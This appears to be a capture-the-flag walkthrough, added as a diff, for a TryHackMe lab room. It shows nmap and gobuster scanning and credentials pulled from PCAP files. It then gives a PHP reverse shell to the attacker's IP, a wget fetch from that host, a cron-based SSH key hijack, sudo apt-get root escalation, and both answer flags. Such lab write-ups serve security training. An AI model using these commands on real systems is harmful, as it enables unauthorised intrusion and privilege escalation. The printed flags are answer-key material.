@@ -1,0 +1,86 @@
+THM - Smog Grotto
+==================================================================
+https://tryhackme.com/room/smaggrotto
+github.com/ttnovo/smoggrotto
+by: TTNOVO 
+
+IP: 10.10.58.166
+Possible user/pass? username=helpdesk & password=cH4nG3M3_n0w
+==================================================================
+If you use own VM you need to use VPN.
+
+1. Download your VPN file on THM if you haven’t done that already, find it and do following command: sudo openvpn FILE.ovpn
+2. then hit your password and you ready to dive in...
+
+I would like to add, do not use these tools on a network youre not allowed to scan, its illegal and they see what you do.
+===================================================================
+As usally lets start with our NMAP scan and Gobuster.
+
+nmap -sC -sV IP (found 22,80)
+gobuster dir -u http://IP:PORT -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+------------------------------------------------------------------
+in the /mail directory I found 3 messages, which is PCAP, With wireshark I can analyze the PCAP files.
+While analyzing, I found it intresting this "login.php" so I followed the HTTP steam on 4th frame.
+We get to know the host which we should add to an host file to be accepted on the server. We gained
+credentials for login which is perfect!
+
+Host: development.smag.thm
+username: helpdesk
+password: cH4nG3M3_n0w
+
+sudo nano etc/hosts
+add your IP and development.smag.thm (save it, by exit, cat is to see you got it)
+ping development.smag.thm (You should get response now, good!)
+
+Lets do an reverse shell! Just do following and you should have one! IP ADDR to get your local IP.
+
+rlwrap nc -nlvp 4100
+
+http://development.smag.thm/ (press login and than do the command under with you local IP (IP ADDR))
+php -r '$sock=fsockopen("10.9.0.105",4100);exec("/bin/bash -i <&3 >&3 2>&3");'
+
+You could navigate thorough the system, but we can not access any files, we need to do more...
+Lets see if there is any intresting in scheduled tasks? 
+
+cat /etc/crontab
+
+The final cron seems to be a task for copying keys, so I kept looking deeper...
+
+ls -l /opt/.backups/jake_id_rsa.pub.backup
+
+ssh-keygen -t rsa (command to create a own new public key in a new window, name it jake and press enter until key created)
+ls
+cat jake.pub
+python -m SimpleHTTPServer 8080
+
+(back to the reverse shell window)
+cd /tmp
+wget http://10.9.0.105:8080/jake.pub
+ls
+cat jake.pub (Nice seems work! After this you can close the python server)
+
+It creates a new public key, wait 2 minutes and you should be able to login, without password.
+
+ssh -i jake jake@10.10.129.0
+
+cd /home
+ls
+cd jake
+ls
+cat user.txt
+
+What is the user flag? 
+Answer: iusGorV7EbmxM5AuIe2w499msaSuqU3j
+
+To get root flag, lets find how we can esculate this further. It seems we can use apt-get. By googling arround I found a
+way to use it as exploit. I usually find my stuff from gtfobins website. Its a great tool to use.
+
+sudo -l 
+sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash
+whoami
+cd /root
+ls
+cat root.txt
+
+What is the root flag?
+Answer: uJr6zRgetaniyHVRqqL58uRasybBKz2T
